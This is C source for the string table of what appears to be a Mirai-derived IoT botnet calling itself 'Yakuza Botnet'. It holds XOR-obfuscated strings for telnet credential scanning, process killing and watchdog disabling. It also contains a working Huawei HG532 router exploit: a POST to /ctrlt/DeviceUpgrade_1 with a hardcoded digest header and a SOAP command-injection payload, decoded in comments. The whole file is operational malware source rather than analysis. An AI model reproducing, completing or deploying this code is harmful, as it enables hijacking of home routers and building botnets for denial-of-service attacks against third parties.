#define _GNU_SOURCE

#ifdef DEBUG
    #include <stdio.h>
#endif
#include <stdint.h>
#include <stdlib.h>

#include "includes.h"
#include "table.h"
#include "util.h"

uint32_t table_key = 0xbaadf00d;
struct table_value table[TABLE_MAX_KEYS];

void table_init(void)
{
    add_entry(TABLE_EXEC_SUCCESS, "\xB3\x8B\x81\x9F\x90\x8B\xCA\xA8\x85\x9E\x84\x8F\x9E\xEA", 14); // Yakuza Botnet
    add_entry(TABLE_INSTANCE_EXISTS, "\xA3\x84\x99\x9E\x8B\x84\x89\x8F\xCA\x8B\x86\x98\x8F\x8B\x8E\x93\xCA\x8F\x92\x83\x99\x9E\x99\xC6\xCA\x85\x9C\x8F\x98\x9D\x98\x83\x9E\x83\x84\x8D\xCA\x89\x9F\x98\x98\x8F\x84\x9E\xCA\x9A\x98\x85\x89\x8F\x99\x99\xC4\xEA", 54); // Instance already exists, overwriting current process.
    
	add_entry(TABLE_SCAN_SHELL, "\x99\x82\x8F\x86\x86\xEA", 6);
    add_entry(TABLE_SCAN_ENABLE, "\x8F\x84\x8B\x88\x86\x8F\xEA", 7);
    add_entry(TABLE_SCAN_SYSTEM, "\x99\x93\x99\x9E\x8F\x87\xEA", 7);
    add_entry(TABLE_SCAN_SH, "\x99\x82\xEA", 3);
    add_entry(TABLE_SCAN_QUERY, "\xC5\x88\x83\x84\xC5\x88\x9F\x99\x93\x88\x85\x92\xCA\xA3\xB0\xDB\xA2\xD3\xEA", 19);
    add_entry(TABLE_SCAN_RESP, "\xA3\xB0\xDB\xA2\xD3\xD0\xCA\x8B\x9A\x9A\x86\x8F\x9E\xCA\x84\x85\x9E\xCA\x8C\x85\x9F\x84\x8E\xEA", 24);
    add_entry(TABLE_SCAN_NCORRECT, "\x84\x89\x85\x98\x98\x8F\x89\x9E\xEA", 9);
    add_entry(TABLE_SCAN_ASSWORD, "\x8B\x99\x99\x9D\x85\x98\x8E\xEA", 8);
    add_entry(TABLE_SCAN_OGIN, "\x85\x8D\x83\x84\xEA", 5);
    add_entry(TABLE_SCAN_ENTER, "\x8F\x84\x9E\x8F\x98\xEA", 6);

    add_entry(TABLE_SCAN_POST, "\xBA\xA5\xB9\xBE\xCA\xC5\x89\x9E\x98\x86\x9E\xC5\xAE\x8F\x9C\x83\x89\x8F\xBF\x9A\x8D\x98\x8B\x8E\x8F\xB5\xDB\xCA\xA2\xBE\xBE\xBA\xC5\xDB\xC4\xDB\xEA", 37); // POST /ctrlt/DeviceUpgrade_1 HTTP/1.1
    add_entry(TABLE_SCAN_CONTENTLEN, "\xA9\x85\x84\x9E\x8F\x84\x9E\xC7\xA6\x8F\x84\x8D\x9E\x82\xD0\xCA\xDE\xD9\xDA\xEA", 20); // Content-Length: 430
    add_entry(TABLE_SCAN_CONNECTION, "\xA9\x85\x84\x84\x8F\x89\x9E\x83\x85\x84\xD0\xCA\x81\x8F\x8F\x9A\xC7\x8B\x86\x83\x9C\x8F\xEA", 23); // Connection: keep-alive
    add_entry(TABLE_SCAN_ACCEPT, "\xAB\x89\x89\x8F\x9A\x9E\xD0\xCA\xC0\xC5\xC0\xEA", 12); // Accept: */*
    add_entry(TABLE_SCAN_AUTH, "\xAB\x9F\x9E\x82\x85\x98\x83\x90\x8B\x9E\x83\x85\x84\xD0\xCA\xAE\x83\x8D\x8F\x99\x9E\xCA\x9F\x99\x8F\x98\x84\x8B\x87\x8F\xD7\xC8\x8E\x99\x86\x8C\xC7\x89\x85\x84\x8C\x83\x8D\xC8\xC6\xCA\x98\x8F\x8B\x86\x87\xD7\xC8\xA2\x9F\x8B\x9D\x8F\x83\xA2\x85\x87\x8F\xAD\x8B\x9E\x8F\x9D\x8B\x93\xC8\xC6\xCA\x84\x85\x84\x89\x8F\xD7\xC8\xD2\xD2\xDC\xDE\xDF\x89\x8F\x8C\x88\xDB\x8C\xD3\x8F\x8E\x8F\xDA\x8F\xD9\xD9\xDC\x8F\xD9\xDF\xDC\xD3\x8E\xDD\xDF\x8F\x8F\xD9\xDA\xC8\xC6\xCA\x9F\x98\x83\xD7\xC8\xC5\x89\x9E\x98\x86\x9E\xC5\xAE\x8F\x9C\x83\x89\x8F\xBF\x9A\x8D\x98\x8B\x8E\x8F\xB5\xDB\xC8\xC6\xCA\x98\x8F\x99\x9A\x85\x84\x99\x8F\xD7\xC8\xD9\xDC\xDB\xD8\x8C\xD2\xDE\xD9\x8B\xDE\xD8\x8E\x88\xD9\xD2\x8C\xDE\xD2\x8C\xDF\xD3\x8E\xD8\x8B\xD9\xDF\xD3\xDD\x8F\xDB\xD3\x89\xC8\xC6\xCA\x8B\x86\x8D\x85\x98\x83\x9E\x82\x87\xD7\xC8\xA7\xAE\xDF\xC8\xC6\xCA\x9B\x85\x9A\xD7\xC8\x8B\x9F\x9E\x82\xC8\xC6\xCA\x84\x89\xD7\xDA\xDA\xDA\xDA\xDA\xDA\xDA\xDB\xC6\xCA\x89\x84\x85\x84\x89\x8F\xD7\xC8\xD8\xDE\xD2\x8E\xDB\x8B\xD8\xDF\xDC\xDA\xDB\xDA\xDA\xDC\xDC\xD3\xC8\xEA", 258); // Authorization: Digest username="dslf-config", realm="HuaweiHomeGateway", nonce="88645cefb1f9ede0e336e3569d75ee30", uri="/ctrlt/DeviceUpgrade_1", response="3612f843a42db38f48f59d2a3597e19c", algorithm="MD5", qop="auth", nc=00000001, cnonce="248d1a2560100669"
    add_entry(TABLE_SCAN_HEADER, "\xD6\xD5\x92\x87\x86\xCA\x9C\x8F\x98\x99\x83\x85\x84\xD7\xC8\xDB\xC4\xDA\xC8\xCA\xD5\xD4\xD6\x99\xD0\xAF\x84\x9C\x8F\x86\x85\x9A\x8F\xCA\x92\x87\x86\x84\x99\xD0\x99\xD7\xC8\x82\x9E\x9E\x9A\xD0\xC5\xC5\x99\x89\x82\x8F\x87\x8B\x99\xC4\x92\x87\x86\x99\x85\x8B\x9A\xC4\x85\x98\x8D\xC5\x99\x85\x8B\x9A\xC5\x8F\x84\x9C\x8F\x86\x85\x9A\x8F\xC5\xC8\xCA\x99\xD0\x8F\x84\x89\x85\x8E\x83\x84\x8D\xB9\x9E\x93\x86\x8F\xD7\xC8\x82\x9E\x9E\x9A\xD0\xC5\xC5\x99\x89\x82\x8F\x87\x8B\x99\xC4\x92\x87\x86\x99\x85\x8B\x9A\xC4\x85\x98\x8D\xC5\x99\x85\x8B\x9A\xC5\x8F\x84\x89\x85\x8E\x83\x84\x8D\xC5\xC8\xD4\xD6\x99\xD0\xA8\x85\x8E\x93\xD4\xD6\x9F\xD0\xBF\x9A\x8D\x98\x8B\x8E\x8F\xCA\x92\x87\x86\x84\x99\xD0\x9F\xD7\xC8\x9F\x98\x84\xD0\x99\x89\x82\x8F\x87\x8B\x99\xC7\x9F\x9A\x84\x9A\xC7\x85\x98\x8D\xD0\x99\x8F\x98\x9C\x83\x89\x8F\xD0\xBD\xAB\xA4\xBA\xBA\xBA\xA9\x85\x84\x84\x8F\x89\x9E\x83\x85\x84\xD0\xDB\xC8\xD4\xD6\xA4\x8F\x9D\xB9\x9E\x8B\x9E\x9F\x99\xBF\xB8\xA6\xD4\xEA", 238); // <?xml version="1.0" ?><s:Envelope xmlns:s="http://schemas.xmlsoap.org/soap/envelope/" s:encodingStyle="http://schemas.xmlsoap.org/soap/encoding/"><s:Body><u:Upgrade xmlns:u="urn:schemas-upnp-org:service:WANPPPConnection:1"><NewStatusURL>
    add_entry(TABLE_SCAN_HEADER2, "\xD6\xC5\xA4\x8F\x9D\xB9\x9E\x8B\x9E\x9F\x99\xBF\xB8\xA6\xD4\xD6\xA4\x8F\x9D\xAE\x85\x9D\x84\x86\x85\x8B\x8E\xBF\xB8\xA6\xD4\xCE\xC2\x8F\x89\x82\x85\xCA\xA2\xBF\xAB\xBD\xAF\xA3\xBF\xBA\xA4\xBA\xC3\xD6\xC5\xA4\x8F\x9D\xAE\x85\x9D\x84\x86\x85\x8B\x8E\xBF\xB8\xA6\xD4\xD6\xC5\x9F\xD0\xBF\x9A\x8D\x98\x8B\x8E\x8F\xD4\xD6\xC5\x99\xD0\xA8\x85\x8E\x93\xD4\xD6\xC5\x99\xD0\xAF\x84\x9C\x8F\x86\x85\x9A\x8F\xD4\xEA", 101); // </NewStatusURL><NewDownloadURL>$(echo HUAWEIUPNP)</NewDownloadURL></u:Upgrade></s:Body></s:Envelope>
    
	add_entry(TABLE_KILLER_PROC, "\xC5\x9A\x98\x85\x89\xC5\xEA", 7);
    add_entry(TABLE_KILLER_EXE, "\xC5\x8F\x92\x8F\xEA", 5);
    add_entry(TABLE_KILLER_FD, "\xC5\x8C\x8E\xEA", 4);
    add_entry(TABLE_KILLER_MAPS, "\xC5\x87\x8B\x9A\x99\xEA", 6);
    add_entry(TABLE_KILLER_TCP, "\xC5\x9A\x98\x85\x89\xC5\x84\x8F\x9E\xC5\x9E\x89\x9A\xEA", 14);
	
    add_entry(TABLE_MAPS_MIRAI, "\x8E\x9C\x98\xA2\x8F\x86\x9A\x8F\x98\xEA", 10);
	
	add_entry(TABLE_ATK_VSE, "\xBE\xB9\x85\x9F\x98\x89\x8F\xCA\xAF\x84\x8D\x83\x84\x8F\xCA\xBB\x9F\x8F\x98\x93\xEA", 21);
    add_entry(TABLE_ATK_RESOLVER, "\xC5\x8F\x9E\x89\xC5\x98\x8F\x99\x85\x86\x9C\xC4\x89\x85\x84\x8C\xEA", 17);
    add_entry(TABLE_ATK_NSERV, "\x84\x8B\x87\x8F\x99\x8F\x98\x9C\x8F\x98\xEA", 11);
	
    add_entry(TABLE_MISC_WATCHDOG, "\xC5\x8E\x8F\x9C\xC5\x9D\x8B\x9E\x89\x82\x8E\x85\x8D\xEA", 14);
    add_entry(TABLE_MISC_WATCHDOG2, "\xC5\x8E\x8F\x9C\xC5\x87\x83\x99\x89\xC5\x9D\x8B\x9E\x89\x82\x8E\x85\x8D\xEA", 19);
    add_entry(TABLE_MISC_WATCHDOG3, "\xC5\x8E\x8F\x9C\xC5\xAC\xBE\xBD\xAE\xBE\xDB\xDA\xDB\xB5\x9D\x8B\x9E\x89\x82\x8E\x85\x8D\xEA", 23);
    add_entry(TABLE_MISC_WATCHDOG4, "\xC5\x8E\x8F\x9C\xC5\xAC\xBE\xBD\xAE\xBE\xDB\xDA\xDB\xB6\xCA\x9D\x8B\x9E\x89\x82\x8E\x85\x8D\xEA", 24);
    add_entry(TABLE_MISC_RANDOM, "\x8B\x88\x89\x8E\x8F\x8C\x8D\x82\x83\x80\x81\x86\x87\x84\x85\x9A\x9B\x98\x99\x9E\x9F\x9C\x9D\x92\x93\x90\xDB\xD8\xD9\xDE\xDF\xDC\xDD\xD2\xD3\xDA\xEA", 37);

	add_entry(TABLE_MEM_1, "\xA4\x83\xAD\xAD\x8F\xB8\xDC\xD3\x92\x8E\xEA", 11);
	add_entry(TABLE_MEM_2, "\xBF\xBA\xB2\xCB\xEA", 5);
	add_entry(TABLE_MEM_3, "\x99\x93\x99\x9F\x9A\x8E\x8B\x9E\x8F\x98\xEA", 11);
	add_entry(TABLE_MEM_4, "", 9);
	add_entry(TABLE_MEM_5, "\xA6\xA5\xA6\xA4\xA5\xAD\xBE\xAC\xA5\xEA", 10);
	add_entry(TABLE_MEM_6, "\xA9\x85\x84\x84\x8F\x89\x9E\x83\x85\x84\xD0\xCA\x81\x8F\x8F\x9A\xC7\x8B\x86\x83\x9C\x8F\xEA", 23);
	add_entry(TABLE_MEM_7, "\xDB\xDE\xAC\x8B\xEA", 5);
	add_entry(TABLE_MEM_8, "\x8B\x99\x99\x9D\x85\x98\x8E\xEA", 8);
	add_entry(TABLE_MEM_9, "", 8);
	add_entry(TABLE_MEM_10, "\x8C\x8C\xDE\xA0\x8C\x8D\xEA", 7);
	add_entry(TABLE_MEM_11, "\xCF\x8E\xC4\xCF\x8E\xC4\xCF\x8E\xC4\xCF\x8E\xEA", 12);
	add_entry(TABLE_MEM_12, "\xA9\x85\x85\x81\x83\x8F\xD0\xEA", 8);
	add_entry(TABLE_MEM_13, "\x8E\x9C\x98\xA2\x8F\x86\x9A\x8F\x98\xEA", 10);
	add_entry(TABLE_MEM_14, "", 5);
	add_entry(TABLE_MEM_15, "\x8B\x88\x89\x8E\x8F\x8C\x8D\x82\x83\x80\x81\x86\x87\x84\x85\x9A\x9B\x98\x99\x9E\x9F\x9C\x9D\xDA\xDB\xD8\xD9\xDE\xDF\xDC\xDD\xD2\xEA", 33);	
}

void table_unlock_val(uint8_t id)
{
    struct table_value *val = &table[id];

    #ifdef DEBUG
        if(!val->locked)
        {
            printf("[table] Tried to double-unlock value %d\n", id);
            return;
        }
    #endif

    toggle_obf(id);
}

void table_lock_val(uint8_t id)
{
    struct table_value *val = &table[id];

    #ifdef DEBUG
        if(val->locked)
        {
            printf("[table] Tried to double-lock value\n");
            return;
        }
    #endif

    toggle_obf(id);
}

char *table_retrieve_val(int id, int *len)
{
    struct table_value *val = &table[id];

    #ifdef DEBUG
        if(val->locked)
        {
            printf("[table] Tried to access table.%d but it is locked\n", id);
            return NULL;
        }
    #endif

    if(len != NULL)
        *len = (int)val->val_len;

    return val->val;
}

static void add_entry(uint8_t id, char *buf, int buf_len)
{
    char *cpy = malloc(buf_len);

    util_memcpy(cpy, buf, buf_len);

    table[id].val = cpy;
    table[id].val_len = (uint16_t)buf_len;

    #ifdef DEBUG
        table[id].locked = TRUE;
    #endif
}

static void toggle_obf(uint8_t id)
{
    int i = 0;
    struct table_value *val = &table[id];
    uint8_t k1 = table_key & 0xff,
            k2 = (table_key >> 8) & 0xff,
            k3 = (table_key >> 16) & 0xff,
            k4 = (table_key >> 24) & 0xff;

    for(i = 0; i < val->val_len; i++)
    {
        val->val[i] ^= k1;
        val->val[i] ^= k2;
        val->val[i] ^= k3;
        val->val[i] ^= k4;
    }

    #ifdef DEBUG
        val->locked = !val->locked;
    #endif
}

